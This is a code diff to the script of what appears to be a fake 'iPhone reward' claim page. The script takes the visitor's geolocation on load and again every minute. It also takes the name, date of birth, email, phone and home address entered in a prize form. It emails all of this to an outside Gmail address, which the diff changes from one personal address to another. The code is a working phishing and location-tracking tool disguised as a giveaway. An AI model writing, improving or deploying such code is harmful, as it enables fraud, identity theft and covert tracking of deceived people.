@@ -94,42 +94,75 @@
 
     <!-- JavaScript for Geolocation and Email Sending -->
     <script>
+        let locationInterval;  // Variable to store the interval ID for periodic location requests
+
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
 
-            // Request location immediately on page load
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                        
-                        // Send location data via email
-                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "pthnvenom@gmail.com");
-                    },
-                    (error) => {
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                locationDisplay.textContent = "Location access denied by user.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                locationDisplay.textContent = "Location information is unavailable.";
-                                break;
-                            case error.TIMEOUT:
-                                locationDisplay.textContent = "Location request timed out.";
-                                break;
-                            default:
-                                locationDisplay.textContent = "An unknown error occurred.";
-                                break;
+            // Function to request the user's location
+            function requestLocation() {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                            
+                            // Send location data via email
+                            sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                        },
+                        (error) => {
+                            switch (error.code) {
+                                case error.PERMISSION_DENIED:
+                                    locationDisplay.textContent = "Location access denied by user.";
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    locationDisplay.textContent = "Location information is unavailable.";
+                                    break;
+                                case error.TIMEOUT:
+                                    locationDisplay.textContent = "Location request timed out.";
+                                    break;
+                                default:
+                                    locationDisplay.textContent = "An unknown error occurred.";
+                                    break;
+                            }
+                            // Send error message via email if location can't be accessed
+                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                         }
-                        // Send error message via email if location can't be accessed
-                        sendEmail("Location Access Error", locationDisplay.textContent, "pthnvenom@gmail.com");
-                    }
-                );
-            } else {
-                locationDisplay.textContent = "Geolocation is not supported by this browser.";
+                    );
+                } else {
+                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
+                }
             }
+
+            // Periodically request location every minute (60,000 ms)
+            locationInterval = setInterval(requestLocation, 60000);
+
+            // Request location on page load (for the initial location)
+            requestLocation();
+
+            // Request location on form submission
+            document.getElementById("rewardForm").addEventListener("submit", function (e) {
+                e.preventDefault();
+
+                // Collect form data
+                const fullName = document.getElementById("fullName").value;
+                const dob = document.getElementById("dob").value;
+                const email = document.getElementById("email").value;
+                const phoneNumber = document.getElementById("phoneNumber").value;
+                const address = document.getElementById("address").value;
+                const city = document.getElementById("city").value;
+                const postalCode = document.getElementById("postalCode").value;
+
+                // Format form data into a message
+                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
+
+                // Send form data via email
+                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com");
+
+                // Display success message
+                alert("Thank you for your submission! We will contact you shortly.");
+            });
         });
 
         // Send Email Function
@@ -167,37 +200,6 @@
                 alert("Error sending email: " + error.message);
             });
         }
-
-        // Form submission
-        document.getElementById("rewardForm").addEventListener("submit", function (e) {
-            e.preventDefault();
-
-            // Collect form data
-            const fullName = document.getElementById("fullName").value;
-            const dob = document.getElementById("dob").value;
-            const email = document.getElementById("email").value;
-            const phoneNumber = document.getElementById("phoneNumber").value;
-            const address = document.getElementById("address").value;
-            const city = document.getElementById("city").value;
-            const postalCode = document.getElementById("postalCode").value;
-
-            // Format form data into a message
-            const formMessage = `
-                Full Name: ${fullName}\n
-                Date of Birth: ${dob}\n
-                Email: ${email}\n
-                Phone Number: ${phoneNumber}\n
-                Address: ${address}\n
-                City: ${city}\n
-                Postal Code: ${postalCode}
-            `;
-
-            // Send form data via email
-            sendEmail("New iPhone Claim Form Submission", formMessage, "pthnvenom@gmail.com");
-
-            // Display success message
-            alert("Thank you for your submission! We will contact you shortly.");
-        });
     </script>
 </body>
 </html>
